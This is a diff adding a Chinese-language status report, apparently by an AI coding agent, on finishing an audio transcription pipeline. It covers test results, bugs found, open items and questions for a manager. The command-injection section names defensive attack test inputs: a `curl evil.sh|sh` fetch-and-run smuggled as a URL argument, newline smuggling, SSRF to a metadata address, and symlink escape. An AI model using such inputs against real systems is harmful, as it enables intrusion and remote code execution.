@@ -83,3 +83,43 @@
 - 本次**真编译、真运行、真计时**。D-04 §10.1 列了 14 项实测验证（附命令与输出）。
 - D-04 §10.2 列了 10 项未验证/UNKNOWN，最关键 3 项：**CUDA vs Vulkan 性能比仍 UNKNOWN**、**mac/Windows 全部分支未验证（无机器）**、**CI workflow 从未执行（无 remote）**。
 - CUDA 与 ROCm 包**未编译**（无 SDK 与硬件），不是"应该能编"，是**没编**。
+
+---
+
+## [2026-08-02 14:40] T-020 DONE
+
+交付:
+- `packages/pipeline/src/**` —— 18 个源文件 + 4 个测试文件（`subprocess/{argGuard,runner}.ts`、`tools.ts`、`media/{types,registry}.ts` + `media/sources/{localFile,directHttp,rss,ytdlp}.ts`、`audio/{ffmpeg,vad}.ts`、`asr/{types,whisperCpp}.ts`、`queue/lanes.ts`、`transcribe.ts`、`index.ts`）
+- `docs/design/D-06-pipeline.md`（id: D-06, status: ready, TL;DR 12 行）
+
+要点（**验收标准逐条实跑，全部贴了真实输出**）:
+- **F2 本地文件端到端** `[实测]`：11.0s 音频 → **0.80s**，RTF **0.047**（**21.3x**），转写逐字正确：`And so, my fellow Americans, ask not what your country can do for you, ask what you can do for your country.`
+- **F1 真实公网 URL 端到端** `[实测]`：`upload.wikimedia.org` 的 1921 Marcus Garvey 演讲（**公有领域**，Commons API 确认 `Copyrighted=False`），2,658,394 字节 → 220.2s 音频 / **9 chunk / 45 段 / 20.2s**，ASR RTF **0.045**（**22.2x**）。**关键：这条是在 `enableSiteExtractor: false`（yt-dlp 完全关闭）下跑通的** → TD-002 不是声称，是跑出来的。
+- **测试 75/75 全绿**，eslint 干净，`tsc -b` 干净。用 Node 内置 `node:test`，**未新增任何依赖**（没碰 oss-scout 的 root package.json）。
+- **命令注入 7 层全部落地，25 个攻击用例逐层对应**：`--exec=curl evil.sh|sh` 当 URL、换行走私（`new URL()` 会静默吞 `\n`，所以控制字符必须在 parse **之前**查）、多字节长度绕过（1000 个 emoji < 2048 字符但 = 4000 字节）、SSRF 打 `169.254.169.254` **和我们自己的 127.0.0.1 daemon 端口**、symlink 逃逸（`path.resolve` 会被骗，必须 `realpath`）、Windows `.bat`（CVE-2024-27980）。
+- **真跑抓到我自己 3 个 bug，全修 + 加回归测试**（D-06 §6.3 详述）：
+  1. `isSafeExecutable` 用**宿主**的 `path.isAbsolute` 判 Windows 路径 → 在 Linux 上 `C:\...` 一律被判穿越，**CVE 那条分支根本不可达，`.bat` 测试一直在为错误的理由通过**。是"断言错误码而不只断言拒绝"这个习惯揪出来的。
+  2. **whisper 的 `offsets` 是绝对时间不是相对时间**（实测 `--offset-t 60000` → 报 `from: 60000`），我又加了一次偏移 → **220s 录音出现 419.9s 的段落**。**单 chunk 测试永远看不见**，只有多 chunk 真跑能暴露 —— 这正是"必须跑真实音频"这条验收标准的价值。
+  3. **chunk 边界重复转写**（whisper 按 30s 窗口解码会越过 `--duration`）→ 时间戳非单调、F5 播放高亮会闪。加 `dedupeBoundarySegments`（要求**时间重叠 >50%**，不能只看文本相似——说话人真的会重复自己）。修复后段数 51→45，`monotonic: true`。
+- **两个意外的省事发现**：① VAD **不需要新依赖** —— whisper.cpp v1.9.1 自带 `whisper-vad-speech-segments`（Silero，MIT），**已在我 T-012 建的 L1 core 包里**；注意输出单位是**厘秒**不是秒（读错会让 chunk 长 100 倍，已加断言守住）。② whisper v1.9.1 的 `--output-json-full` **不输出 `avg_logprob`/`no_speech_prob`**（实测 segment 只有 `['timestamps','offsets','text','tokens']`）→ 置信度改用**真实 token 概率均值**（排除 `[_BEG_]` 否则虚高），实测 0.65–0.93，与文本质量吻合。
+- **TD-002 的真正修正**：D-01 §6.4 的规则是**按 probe 结果回退**而非按 URL 打分。我第一版只做了打分，导致 watch 页 URL 被 DirectHttp（30 分）截胡后直接失败、永远到不了兜底 —— 是测试逼出了这个修正。现在 `registry.probe()` 依次真的尝试每个候选。
+- **GPU lane 互斥已测**：4 个混合任务下**同时占用违例 = 0**；异常路径与排队中 abort 两条路径都不泄漏 permit（泄漏会死锁掉之后所有 GPU 任务）。
+
+下一步建议:
+- **F3 流式是唯一没动的功能**：`SherpaOnnxEngine` 未实现，只留了 `AsrEngine.openStream?` 可选接口；F3 两阶段（流式→离线重跑提准）也未实现。建议单开一个任务，接 `sherpa-onnx-node`（npm 有完整 per-platform 预编译，T-002 已核实）。
+- **真跑一次 yt-dlp 路径**：本机未装（ADR-001 C 类运行时下载），§2 L4 那组硬化参数（尤其 `--ignore-config`）**一行都没真跑过**。
+- 换 `large-v3-turbo` 复测质量：base.en 在 1921 年蜡筒录音上把 "Negroes" 误识成 "nicles"，量一下模型档位的实际影响（ADR-004 决策 3：跑真实基准不编数字）。
+
+需要 Manager 决策:
+1. **`SubprocessRunner` 的位置**：D-01 §8.4 写的是 `apps/daemon/src/subprocess/**`，我实现在 `packages/pipeline/src/subprocess/`（spawn 实际发生地，daemon 直接 import 即可）。请确认这个调整，并据此定 CI 的 `no-restricted-imports` 路径白名单（我没改 eslint 配置，不是我的文件）。
+2. **F3 流式排期**：是否单开任务给我或他人。
+3. **两个已知 TOCTOU 缺口是否进 v1**（D-06 §9.2 第 7/8 条）：DNS rebinding（需自定义 `lookup` 钉住 IP）、路径校验后未立即转 fd 操作。目前**已记录未修**。
+
+派生 subagent 记录（未 kill，可复用）:
+- `abab65376c60e9bee` — 公有领域测试音频 + Silero VAD + yt-dlp 参数核实（sonnet5，已完成）
+- T-002/T-012 的 5 个仍可复用（见前两条回执）
+
+诚实声明:
+- D-06 §9.1 列了 10 项已实测（附命令与输出），§9.2 列了 **12 项未验证/未实现**。
+- **未实现**：F3 流式引擎、F3 两阶段。**未真跑**：yt-dlp 路径、真实 RSS feed、真实 HLS 流、Windows/macOS 分支、长音频（最长只测到 220s）、中途取消、`nice`、中文多语种（只测了英文）。
+- 两个 TOCTOU 缺口是**已知未修**，不是"应该没问题"。
